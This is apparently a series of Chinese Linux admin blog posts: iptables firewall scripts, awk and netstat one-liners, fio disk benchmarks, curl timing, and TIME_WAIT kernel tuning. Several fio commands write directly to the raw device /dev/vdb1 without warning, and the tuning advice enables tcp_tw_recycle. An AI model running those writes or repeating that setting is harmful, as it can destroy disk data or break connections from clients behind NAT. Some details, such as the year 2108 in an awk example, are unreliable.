只开放本机的web服务（80）、FTP(20、21、20450-20480)，放行外部主机发住服务器其它端口的应答数据包，将其他入站数据包均予以丢弃处理。1234iptables -I INPUT -p tcp -m multiport --dport 20,21,80 -j ACCEPT iptables -I INPUT -p tcp --dport 20450:20480 -j ACCEPT iptables -I INPUT -p tcp -m state --state ESTABLISHED -j ACCEPT iptables -P INPUT DROP 下面两句话可以定义默认全部丢弃数据包：12iptables -P INPUT DROPiptables -P OUTPUT DROP -P参数的意思是policy，翻译成策略～那么这两句话就好理解了。 第一句的意思是： 输入(INPUT)的数据包默认的策略(-P)是丢弃(DROP)的 第二句的意思是： 输出(OUTPUT)的数据包默认的策略(-P)是丢弃(DROP)的 其实到这里已经是一个有用的防火墙了，只不过，没有什么意义，和拔掉网线的概念没有什么不同 首先写下这6句话123456789101112iptables -A INPUT -p icmp --icmp-type any -j ACCEPT允许icmp包进入iptables -A INPUT -s localhost -d localhost -j ACCEPT允许本地的数据包iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT允许已经建立和相关的数据包进入iptables -A OUTPUT -p icmp --icmp any -j ACCEPT允许icmp包出去iptables -A OUTPUT -s localhost -d localhost -j ACCEPT允许本地数据包iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT允许已经建立和相关的数据包出去 说明一下，这6句基本上都是要的 查看nat表1234iptables -t nat -vnL POSTROUTING --line-number Chain POSTROUTING (policy ACCEPT 38 packets, 2297 bytes) num pkts bytes target prot opt in out source destination 1 0 0 MASQUERADE all -- * * 192.168.10.0/24 0.0.0.0/0 查看filter表12iptables -L -n --line-number |grep 21 //--line-number可以显示规则序号，在删除的时候比较方便 5 ACCEPT tcp -- 192.168.1.0/24 0.0.0.0/0 tcp dpt:21 总结附最经典的iptables脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#!/bin/sh#modprobe ipt_MASQUERADEmodprobe ip_conntrack_ftpmodprobe ip_nat_ftpiptables -Fiptables -t nat -Fiptables -Xiptables -t nat -X###########################INPUT键###################################iptables -P INPUT DROPiptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPTiptables -A INPUT -p tcp -m multiport --dports 110,80,25 -j ACCEPTiptables -A INPUT -p tcp -s 192.168.0.0/24 --dport 139 -j ACCEPT#允许内网samba,smtp,pop3,连接iptables -A INPUT -i eth1 -p udp -m multiport --dports 53 -j ACCEPT#允许dns连接iptables -A INPUT -p tcp --dport 1723 -j ACCEPTiptables -A INPUT -p gre -j ACCEPT#允许外网vpn连接iptables -A INPUT -s 192.186.0.0/24 -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPTiptables -A INPUT -i ppp0 -p tcp --syn -m connlimit --connlimit-above 15 -j DROP#为了防止DOS太多连接进来,那么可以允许最多15个初始连接,超过的丢弃iptables -A INPUT -s 192.186.0.0/24 -p tcp --syn -m connlimit --connlimit-above 15 -j DROP#为了防止DOS太多连接进来,那么可以允许最多15个初始连接,超过的丢弃iptables -A INPUT -p icmp -m limit --limit 3/s -j LOG --log-level INFO --log-prefix "ICMP packet IN: "iptables -A INPUT -p icmp -j DROP#禁止icmp通信-ping 不通iptables -t nat -A POSTROUTING -o ppp0 -s 192.168.0.0/24 -j MASQUERADE#内网转发iptables -N syn-floodiptables -A INPUT -p tcp --syn -j syn-floodiptables -I syn-flood -p tcp -m limit --limit 3/s --limit-burst 6 -j RETURNiptables -A syn-flood -j REJECT#防止SYN攻击 轻量#######################FORWARD链###########################iptables -P FORWARD DROPiptables -A FORWARD -p tcp -s 192.168.0.0/24 -m multiport --dports 80,110,21,25,1723 -j ACCEPTiptables -A FORWARD -p udp -s 192.168.0.0/24 --dport 53 -j ACCEPTiptables -A FORWARD -p gre -s 192.168.0.0/24 -j ACCEPTiptables -A FORWARD -p icmp -s 192.168.0.0/24 -j ACCEPT#允许 vpn客户走vpn网络连接外网iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPTiptables -I FORWARD -p udp --dport 53 -m string --string "tencent" -m time --timestart 8:15 --timestop 12:30 --days Mon,Tue,Wed,Thu,Fri,Sat -j DROP#星期一到星期六的8:00-12:30禁止qq通信iptables -I FORWARD -p udp --dport 53 -m string --string "TENCENT" -m time --timestart 8:15 --timestop 12:30 --days Mon,Tue,Wed,Thu,Fri,Sat -j DROP#星期一到星期六的8:00-12:30禁止qq通信iptables -I FORWARD -p udp --dport 53 -m string --string "tencent" -m time --timestart 13:30 --timestop 20:30 --days Mon,Tue,Wed,Thu,Fri,Sat -j DROPiptables -I FORWARD -p udp --dport 53 -m string --string "TENCENT" -m time --timestart 13:30 --timestop 20:30 --days Mon,Tue,Wed,Thu,Fri,Sat -j DROP#星期一到星期六的13:30-20:30禁止QQ通信iptables -I FORWARD -s 192.168.0.0/24 -m string --string "qq.com" -m time --timestart 8:15 --timestop 12:30 --days Mon,Tue,Wed,Thu,Fri,Sat -j DROP#星期一到星期六的8:00-12:30禁止qq网页iptables -I FORWARD -s 192.168.0.0/24 -m string --string "qq.com" -m time --timestart 13:00 --timestop 20:30 --days Mon,Tue,Wed,Thu,Fri,Sat -j DROP#星期一到星期六的13:30-20:30禁止QQ网页iptables -I FORWARD -s 192.168.0.0/24 -m string --string "ay2000.net" -j DROPiptables -I FORWARD -d 192.168.0.0/24 -m string --string "宽频影院" -j DROPiptables -I FORWARD -s 192.168.0.0/24 -m string --string "色情" -j DROPiptables -I FORWARD -p tcp --sport 80 -m string --string "广告" -j DROP#禁止ay2000.net，宽频影院，色情，广告网页连接 ！但中文 不是很理想iptables -A FORWARD -m ipp2p --edk --kazaa --bit -j DROPiptables -A FORWARD -p tcp -m ipp2p --ares -j DROPiptables -A FORWARD -p udp -m ipp2p --kazaa -j DROP#禁止BT连接iptables -A FORWARD -p tcp --syn --dport 80 -m connlimit --connlimit-above 15 --connlimit-mask 24#######################################################################sysctl -w net.ipv4.ip_forward=1 &>/dev/null#打开转发#######################################################################sysctl -w net.ipv4.tcp_syncookies=1 &>/dev/null#打开 syncookie （轻量级预防 DOS 攻击）sysctl -w net.ipv4.netfilter.ip_conntrack_tcp_timeout_established=3800 &>/dev/null#设置默认 TCP 连接痴呆时长为 3800 秒（此选项可以大大降低连接数）sysctl -w net.ipv4.ip_conntrack_max=300000 &>/dev/null#设置支持最大连接树为 30W（这个根据你的内存和 iptables 版本来，每个 connection 需要 300 多个字节）#######################################################################iptables -I INPUT -s 192.168.0.50 -j ACCEPTiptables -I FORWARD -s 192.168.0.50 -j ACCEPT#192.168.0.50是我的机子，全部放行！############################完######################################### document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux awk 命令]]></title>
    <url>%2F2019%2F04%2F22%2Flinux-awk%2F</url>
    <content type="text"><![CDATA[对今天解决不了的事情，也不要着急。因为明天也可能还是解决不了。 awk命令例子：123456打印文件的第一列(域) awk '{print $1}' filename打印文件的前两列(域) awk '{print $1,$2}' filename打印完第一列，然后打印第二列 awk '{print $1 $2}' filename打印文本文件的总行数 awk 'END{print NR}' filename打印文本第一行 awk 'NR==1{print}' filename打印文本第二行第一列 sed -n "2, 1p" filename | awk 'print $1' Bash里面的赋值方法有两种，格式为121) arg=`(命令)`2) arg=$(命令) 想要把某一文件的总行数赋值给变量nlines，可以表达为：1231) nlines=`(awk 'END{print NR}' filename)`或2) nlines=$(awk 'END{print NR}' filename) 123456awk '/[^0-9][0-9].*Starting the backup operation/{print $1,$2}' /data/backup/logs/all.log#181217 02:12:48#181217 02:12:48 innobackupex: Starting the backup operationawk '/[^0-9][0-9].*OK\!/{print $1,$2}' /data/backup/logs/all.log#181217 03:51:21#181217 03:51:21 completed OK! 时间相减1awk 'BEGIN{tstamp1=mktime("2108 12 18 02 12 48");tstamp2=mktime("2018 12 19 03 51 12");print tstamp2-tstamp1;}' 从库周期性延迟 需要你从binlog中找出找个binlog 各种操作的统计1mysqlbinlog --no-defaults --base64-output='decode-rows' -v -v mysql-bin.004177 | awk '/UPDATE|INSERT|DELETE/{gsub("###","");gsub("INSERT.*INTO","INSERT");gsub("DELETE.*FROM","DELETE");count[$1" "$2]++}END{for(i in count)print i,"\t",count[i]}' |sort -k3nr|head -n 20 netstat and AWK123456789netstat -an | awk '/^tcp/ {++S[$NF]};END {for(a in S) print a,S[a]}'netstat -an | awk '/^tcp/ {++state[$NF]}; END {for(key in state) print key,"\t",state[key]}'netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -cnetstat -anlp | grep 3306 | grep tcp | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -nr | head -n20netstat -ant | awk '/:3306/{split($5,ip,":");++A[ip[1]]}END{for(i in A) print A[i],i}' | sort -nr | head -n20netstat -an | grep SYN | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -nr | moretcpdump -i eno16777736 -tnn dst port 80 -c 1000 | awk -F"." '{print $1"."$2"."$3"."$4}' | sort | uniq -c | sort -nr | head -20 查看表的大小排序12du -s *|grep ibd|sort|uniq -u|sort -nr|awk '{print $2}'|xargs du -shdu -s *|grep ibd|sort|uniq -u|sort -nr|awk '{print $2}'|sort|uniq -u|xargs du -sh 僵尸进程1ps -A -o stat,ppid,pid,cmd | grep -e '\''^[Zz]'\'' | awk '\''{print }'\'' | xargs kill -9' document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用FIO测试主机IOPS及写入读取速度]]></title>
    <url>%2F2019%2F04%2F22%2Flinux-fio%2F</url>
    <content type="text"><![CDATA[别说你一无所长，熬夜玩手机你是一把好手。 前言安装FIO1yum install fio -y 参数说明:1234567891011bs=4k 单次io的块文件大小为4kbsrange=512-2048 同上，提定数据块的大小范围size=5g 本次的测试文件大小为5g，以每次4k的io进行测试numjobs=30 本次的测试线程为30runtime=1000 测试时间为1000秒，如果不写则一直将5g文件分4k每次写完为止ioengine=psync io引擎使用pync方式，如果要使用libaio引擎，需要yum install libaio-devel包rwmixwrite=30 在混合读写的模式下，写占30%group_reporting 关于显示结果的，汇总每个进程的信息此外lockmem=1g 只使用1g内存进行测试zero_buffers 用0初始化系统buffernrfiles=8 每个进程生成文件的数量 FIO 命令12345678910111213141516171819202122232425262728293031323334fio -direct=1 -iodepth=128 -rw=write -ioengine=libaio -bs=4k -size=100G -numjobs=1 -runtime=1000 -group_reporting -name=test -filename=/data/test111运行结果：test: (g=0): rw=write, bs=4K-4K/4K-4K/4K-4K, ioengine=libaio, iodepth=128fio-2.0.13Starting 1 processtest: Laying out IO file(s) (1 file(s) / 102400MB)Jobs: 1 (f=1): [W] [100.0% done] [0K/129.3M/0K /s] [0 /33.1K/0 iops] [eta 00m:00s]test: (groupid=0, jobs=1): err= 0: pid=594: Mon May 14 10:27:54 2018 write: io=102400MB, bw=129763KB/s, iops=32440 , runt=808070msec slat (usec): min=0 , max=80322 , avg=12.06, stdev=24.73 clat (usec): min=222 , max=254410 , avg=3932.47, stdev=5007.90 lat (usec): min=622 , max=254416 , avg=3944.82, stdev=5007.26 clat percentiles (usec): | 1.00th=[ 1288], 5.00th=[ 1560], 10.00th=[ 1736], 20.00th=[ 1992], | 30.00th=[ 2224], 40.00th=[ 2480], 50.00th=[ 2736], 60.00th=[ 3088], | 70.00th=[ 3536], 80.00th=[ 4320], 90.00th=[ 6624], 95.00th=[ 9664], | 99.00th=[21120], 99.50th=[37632], 99.90th=[54528], 99.95th=[78336], | 99.99th=[177152] bw (KB/s) : min=20720, max=215424, per=100.00%, avg=129801.50, stdev=19878.75 lat (usec) : 250=0.01%, 750=0.01%, 1000=0.09% lat (msec) : 2=20.47%, 4=56.01%, 10=18.78%, 20=3.20%, 50=1.33% lat (msec) : 100=0.09%, 250=0.02%, 500=0.01% cpu : usr=4.88%, sys=36.64%, ctx=9409837, majf=0, minf=23 IO depths : 1=0.1%, 2=0.1%, 4=0.1%, 8=0.1%, 16=0.1%, 32=0.1%, >=64=100.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.1% issued : total=r=0/w=26214400/d=0, short=r=0/w=0/d=0Run status group 0 (all jobs): WRITE: io=102400MB, aggrb=129763KB/s, minb=129763KB/s, maxb=129763KB/s, mint=808070msec, maxt=808070msecDisk stats (read/write): vdb: ios=0/26203032, merge=0/3962, ticks=0/90681446, in_queue=90672667, util=100.00% 100%随机，100%读，4K12345678910111213141516171819202122232425262728293031323334353637383940414243444546fio -filename=/dev/vdb1 -direct=1 -iodepth 1 -thread -rw=randread -ioengine=psync -bs=4k -size=100G -numjobs=50 -runtime=180 -group_reporting -name=rand_100read_4k运行结果：rand_100read_4k: (g=0): rw=randread, bs=4K-4K/4K-4K/4K-4K, ioengine=psync, iodepth=1...rand_100read_4k: (g=0): rw=randread, bs=4K-4K/4K-4K/4K-4K, ioengine=psync, iodepth=1fio-2.0.13Starting 50 threadsJobs: 50 (f=50): [rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr] [100.0% done] [47544K/0K/0K /s] [11.9K/0 /0 iops] [eta 00m:00s]rand_100read_4k: (groupid=0, jobs=50): err= 0: pid=25884: Mon May 14 14:59:44 2018 read : io=8454.3MB, bw=48091KB/s, iops=12022 , runt=180018msec clat (usec): min=318 , max=167471 , avg=4156.60, stdev=8363.94 lat (usec): min=318 , max=167472 , avg=4156.89, stdev=8363.95 clat percentiles (usec): | 1.00th=[ 1032], 5.00th=[ 1176], 10.00th=[ 1240], 20.00th=[ 1352], | 30.00th=[ 1464], 40.00th=[ 1688], 50.00th=[ 1832], 60.00th=[ 1944], | 70.00th=[ 2064], 80.00th=[ 2288], 90.00th=[15808], 95.00th=[18560], | 99.00th=[20608], 99.50th=[39168], 99.90th=[134144], 99.95th=[144384], | 99.99th=[156672] bw (KB/s) : min= 231, max= 7248, per=2.00%, avg=961.78, stdev=384.46 lat (usec) : 500=0.05%, 750=0.20%, 1000=0.51% lat (msec) : 2=64.37%, 4=19.62%, 10=2.88%, 20=10.62%, 50=1.52% lat (msec) : 100=0.02%, 250=0.23% cpu : usr=0.00%, sys=0.02%, ctx=1813752, majf=18446744073709550866, minf=18446744073698419008 IO depths : 1=100.0%, 2=0.0%, 4=0.0%, 8=0.0%, 16=0.0%, 32=0.0%, >=64=0.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.0% issued : total=r=2164296/w=0/d=0, short=r=0/w=0/d=0Run status group 0 (all jobs): READ: io=8454.3MB, aggrb=48090KB/s, minb=48090KB/s, maxb=48090KB/s, mint=180018msec, maxt=180018msecDisk stats (read/write): vdb: ios=2163559/42, merge=23/10, ticks=8925036/223, in_queue=8922540, util=99.94%100%随机，100%写， 4K[root@test-db data]# fio -filename=/dev/vdb1 -direct=1 -iodepth 1 -thread -rw=randwrite -ioengine=psync -bs=4k -size=100G -numjobs=50 -runtime=180 -group_reporting -name=rand_100write_4k运行结果：rand_100write_4k: (g=0): rw=randwrite, bs=4K-4K/4K-4K/4K-4K, ioengine=psync, iodepth=1...rand_100write_4k: (g=0): rw=randwrite, bs=4K-4K/4K-4K/4K-4K, ioengine=psync, iodepth=1fio-2.0.13Starting 50 threadsJobs: 50 (f=50): [wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww] [100.0% done] [0K/47996K/0K /s] [0 /11.1K/0 iops] [eta 00m:00s]rand_100write_4k: (groupid=0, jobs=50): err= 0: pid=25963: Mon May 14 15:08:43 2018 write: io=8445.5MB, bw=48039KB/s, iops=12009 , runt=180024msec 100%顺序，100%读 ，4K1234567891011121314151617181920212223242526272829303132fio -filename=/dev/vdb1 -direct=1 -iodepth 1 -thread -rw=read -ioengine=psync -bs=4k -size=100G -numjobs=50 -runtime=180 -group_reporting -name=sqe_100read_4k运行结果：sqe_100read_4k: (g=0): rw=read, bs=4K-4K/4K-4K/4K-4K, ioengine=psync, iodepth=1fio-2.0.13Starting 50 threadsJobs: 50 (f=50): [RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR] [100.0% done] [59996K/0K/0K /s] [14.1K/0 /0 iops] [eta 00m:00s]sqe_100read_4k: (groupid=0, jobs=50): err= 0: pid=26047: Mon May 14 15:13:02 2018 read : io=10599MB, bw=60295KB/s, iops=15073 , runt=180006msec clat (usec): min=253 , max=550591 , avg=3315.70, stdev=26406.30 lat (usec): min=254 , max=550591 , avg=3315.95, stdev=26406.30 clat percentiles (usec): | 1.00th=[ 1176], 5.00th=[ 1240], 10.00th=[ 1256], 20.00th=[ 1288], | 30.00th=[ 1336], 40.00th=[ 1368], 50.00th=[ 1416], 60.00th=[ 1480], | 70.00th=[ 1528], 80.00th=[ 1592], 90.00th=[ 1736], 95.00th=[ 2800], | 99.00th=[17792], 99.50th=[18816], 99.90th=[522240], 99.95th=[528384], | 99.99th=[536576] bw (KB/s) : min= 15, max= 2475, per=2.00%, avg=1206.47, stdev=634.32 lat (usec) : 500=0.01%, 750=0.01%, 1000=0.04% lat (msec) : 2=92.64%, 4=3.87%, 10=1.05%, 20=2.03%, 50=0.01% lat (msec) : 250=0.01%, 500=0.17%, 750=0.15% cpu : usr=0.05%, sys=0.23%, ctx=2697397, majf=0, minf=18446744073708900853 IO depths : 1=100.0%, 2=0.0%, 4=0.0%, 8=0.0%, 16=0.0%, 32=0.0%, >=64=0.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.0% issued : total=r=2713362/w=0/d=0, short=r=0/w=0/d=0Run status group 0 (all jobs): READ: io=10599MB, aggrb=60294KB/s, minb=60294KB/s, maxb=60294KB/s, mint=180006msec, maxt=180006msecDisk stats (read/write): vdb: ios=2711304/55, merge=1805/10, ticks=8899022/202, in_queue=8898860, util=100.00% 100%顺序，100%写 ，4K12345678910111213141516171819202122232425262728293031323334fio -filename=/dev/vdb1 -direct=1 -iodepth 1 -thread -rw=write -ioengine=psync -bs=4k -size=100G -numjobs=50 -runtime=180 -group_reporting -name=sqe_100write_4k运行结果：sqe_100write_4k: (g=0): rw=write, bs=4K-4K/4K-4K/4K-4K, ioengine=psync, iodepth=1...sqe_100write_4k: (g=0): rw=write, bs=4K-4K/4K-4K/4K-4K, ioengine=psync, iodepth=1fio-2.0.13Starting 50 threadsJobs: 50 (f=50): [WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW] [100.0% done] [0K/55788K/0K /s] [0 /13.1K/0 iops] [eta 00m:00s]sqe_100write_4k: (groupid=0, jobs=50): err= 0: pid=26100: Mon May 14 15:17:24 2018 write: io=10002MB, bw=56896KB/s, iops=14224 , runt=180019msec clat (usec): min=583 , max=457330 , avg=3513.01, stdev=9958.13 lat (usec): min=584 , max=457331 , avg=3513.60, stdev=9958.13 clat percentiles (usec): | 1.00th=[ 1224], 5.00th=[ 1384], 10.00th=[ 1480], 20.00th=[ 1592], | 30.00th=[ 1672], 40.00th=[ 1752], 50.00th=[ 1832], 60.00th=[ 1928], | 70.00th=[ 2096], 80.00th=[ 2480], 90.00th=[ 6368], 95.00th=[12480], | 99.00th=[20608], 99.50th=[37120], 99.90th=[166912], 99.95th=[268288], | 99.99th=[346112] bw (KB/s) : min= 152, max= 2432, per=2.01%, avg=1141.03, stdev=401.10 lat (usec) : 750=0.01%, 1000=0.11% lat (msec) : 2=65.06%, 4=21.62%, 10=7.36%, 20=4.40%, 50=1.24% lat (msec) : 100=0.08%, 250=0.06%, 500=0.07% cpu : usr=0.05%, sys=0.38%, ctx=2547790, majf=0, minf=18446744073708899536 IO depths : 1=100.0%, 2=0.0%, 4=0.0%, 8=0.0%, 16=0.0%, 32=0.0%, >=64=0.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.0% issued : total=r=0/w=2560604/d=0, short=r=0/w=0/d=0Run status group 0 (all jobs): WRITE: io=10002MB, aggrb=56896KB/s, minb=56896KB/s, maxb=56896KB/s, mint=180019msec, maxt=180019msecDisk stats (read/write): vdb: ios=63/2558949, merge=0/275, ticks=12/8897256, in_queue=8895411, util=100.00% 100%随机，70%读，30%写 4K123456789101112131415161718192021222324252627282930313233343536373839404142434445fio -filename=/dev/vdb1 -direct=1 -iodepth 1 -thread -rw=randrw -rwmixread=70 -ioengine=psync -bs=4k -size=100G -numjobs=50 -runtime=180 -group_reporting -name=randrw_70read_4k运行结果：randrw_70read_4k: (g=0): rw=randrw, bs=4K-4K/4K-4K/4K-4K, ioengine=psync, iodepth=1...randrw_70read_4k: (g=0): rw=randrw, bs=4K-4K/4K-4K/4K-4K, ioengine=psync, iodepth=1fio-2.0.13Starting 50 threadsJobs: 50 (f=50): [mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm] [100.0% done] [48012K/20800K/0K /s] [12.3K/5200 /0 iops] [eta 00m:00s]randrw_70read_4k: (groupid=0, jobs=50): err= 0: pid=26162: Mon May 14 15:29:18 2018 read : io=8430.4MB, bw=47954KB/s, iops=11988 , runt=180020msec clat (usec): min=304 , max=177969 , avg=3045.60, stdev=5103.08 lat (usec): min=304 , max=177970 , avg=3045.87, stdev=5103.08 clat percentiles (usec): | 1.00th=[ 860], 5.00th=[ 1048], 10.00th=[ 1160], 20.00th=[ 1320], | 30.00th=[ 1448], 40.00th=[ 1560], 50.00th=[ 1656], 60.00th=[ 1768], | 70.00th=[ 1896], 80.00th=[ 2128], 90.00th=[ 4384], 95.00th=[17792], | 99.00th=[20352], 99.50th=[28544], 99.90th=[41216], 99.95th=[57088], | 99.99th=[127488] bw (KB/s) : min= 206, max= 4424, per=2.00%, avg=959.77, stdev=408.18 write: io=3613.8MB, bw=20556KB/s, iops=5138 , runt=180020msec clat (usec): min=569 , max=157336 , avg=2617.23, stdev=2821.20 lat (usec): min=570 , max=157337 , avg=2617.81, stdev=2821.20 clat percentiles (usec): | 1.00th=[ 1096], 5.00th=[ 1432], 10.00th=[ 1592], 20.00th=[ 1768], | 30.00th=[ 1912], 40.00th=[ 2040], 50.00th=[ 2160], 60.00th=[ 2288], | 70.00th=[ 2416], 80.00th=[ 2576], 90.00th=[ 2864], 95.00th=[ 3472], | 99.00th=[19328], 99.50th=[20352], 99.90th=[22400], 99.95th=[37632], | 99.99th=[52992] bw (KB/s) : min= 62, max= 1888, per=2.00%, avg=411.23, stdev=178.61 lat (usec) : 500=0.06%, 750=0.22%, 1000=2.28% lat (msec) : 2=61.13%, 4=27.68%, 10=3.02%, 20=4.48%, 50=1.07% lat (msec) : 100=0.04%, 250=0.01% cpu : usr=0.01%, sys=0.08%, ctx=2743663, majf=0, minf=18446744073698904078 IO depths : 1=100.0%, 2=0.0%, 4=0.0%, 8=0.0%, 16=0.0%, 32=0.0%, >=64=0.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.0% issued : total=r=2158165/w=925122/d=0, short=r=0/w=0/d=0Run status group 0 (all jobs): READ: io=8430.4MB, aggrb=47953KB/s, minb=47953KB/s, maxb=47953KB/s, mint=180020msec, maxt=180020msec WRITE: io=3613.8MB, aggrb=20555KB/s, minb=20555KB/s, maxb=20555KB/s, mint=180020msec, maxt=180020msecDisk stats (read/write): vdb: ios=2154562/923535, merge=0/0, ticks=6503566/2394699, in_queue=8896553, util=99.93% 总结执行结果说明:123456789101112131415161718192021222324252627io=执行了多少M的IObw=平均IO带宽iops=IOPSrunt=线程运行时间slat=提交延迟clat=完成延迟lat=响应时间bw=带宽cpu=利用率IO depths=io队列IO submit=单个IO提交要提交的IO数IO complete=Like the above submit number, but for completions instead.IO issued=The number of read/write requests issued, and how many of them were short.IO latencies=IO完延迟的分布io=总共执行了多少size的IOaggrb=group总带宽minb=最小.平均带宽.maxb=最大平均带宽.mint=group中线程的最短运行时间.maxt=group中线程的最长运行时间.ios=所有group总共执行的IO数.merge=总共发生的IO合并数.ticks=Number of ticks we kept the disk busy.io_queue=花费在队列上的总共时间.util=磁盘利用率 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[curl 来测试网站-dns解析时间,响应时间,传输时间]]></title>
    <url>%2F2019%2F04%2F22%2Fcurl-dns-time%2F</url>
    <content type="text"><![CDATA[有些人努力了一辈子，也就从社会的四流进入了三流。 获取 解析时间:响应时间:传输时间12test_dbs2 ~ # curl -o /dev/null -s -w %{time_connect}:%{time_starttransfer}:%{time_total} https://jiemin.wang 0.104:0.000:18.174 给出对站点执行 curl 命令的情况.输出通常是 HTML 代码,通过 -o 参数发送到 /dev/null. -s 参数去掉所有状态信息. -w 参数让 curl 写出计时器的状态信息。 参数说明:12345time_connect 建立到服务器的 TCP 连接所用的时间time_starttransfer 在发出请求之后,Web 服务器返回数据的第一个字节所用的时间time_total 完成请求所用的时间time_namelookup DNS解析时间,从请求开始到DNS解析完毕所用时间(记得关掉 Linux 的 nscd 的服务测试)speed_download 下载速度，单位-字节每秒。 这些计时器都相对于事务的起始时间,甚至要先于 Domain Name Service（DNS）查询.因此,在发出请求之后,Web 服务器处理请求并开始发回数据所用的时间是 0.000 - 0.104 = 0 秒.客户机从服务器下载数据所用的时间是 18.174 - 0.000 = 18 秒. 通过观察 curl 数据及其随时间变化的趋势,可以很好地了解站点对用户的响应性.以上变量会按CURL认为合适的格式输出，输出变量需要按照%{variable_name}的格式，如果需要输出%，double一下即可，即%%，同时，n是换行，r是回车，t是TAB。 当然,Web 站点不仅仅由页面组成.它还有图像、JavaScript 代码、CSS 和 cookie 要处理.curl 很适合了解单一元素的响应时间,但是有时候需要了解整个页面的装载速度. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux-TIME-WAIT]]></title>
    <url>%2F2019%2F04%2F22%2Flinux-TIME-WAIT%2F</url>
    <content type="text"><![CDATA[没事听听别人口中的自己，这比看大片还刺激，你会发现你什么都没做，但已经演了好多版本，都是大角色。 前言TIME_WAIT 状态原理当客户端主动关闭连接时，会发送最后一个ACK，然后会进入TIME_WAIT状态，再停留2个MSL时间(约1-4分钟)，进入CLOSED状态。 详细CentOS6/7.x默认没有对系统参数进行设置，当大量TIME_WAIT产生的时候会影响系统性能， 统计TIME_WAIT状态数量1netstat -ano | grep TIME_WAIT | wc -l 查看系统当前连接状态1234567netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'TIME_WAIT 1280FIN_WAIT1 7SYN_SENT 1FIN_WAIT2 7ESTABLISHED 247LAST_ACK 1 我们只用关心TIME_WAIT的个数，在这里可以看到，有1280多个TIME_WAIT，这样就占用了1280多个端口，端口的数量只有65535个，占用一个少一个，会严重的影响到后继的新连接，就需调整下Linux的TCP内核参数，让系统更快的释放TIME_WAIT连接。 解决方法如下： 修改内核配置vim /etc/sysctl.conf ，加入以下内容：1234net.ipv4.tcp_syncookies = 1 #表示开启SYN Cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭；net.ipv4.tcp_tw_reuse = 1 #表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭；net.ipv4.tcp_tw_recycle = 1 #表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭；net.ipv4.tcp_fin_timeout = 30 #修改系統默认的 TIMEOUT 时间。 然后执行1/sbin/sysctl -p 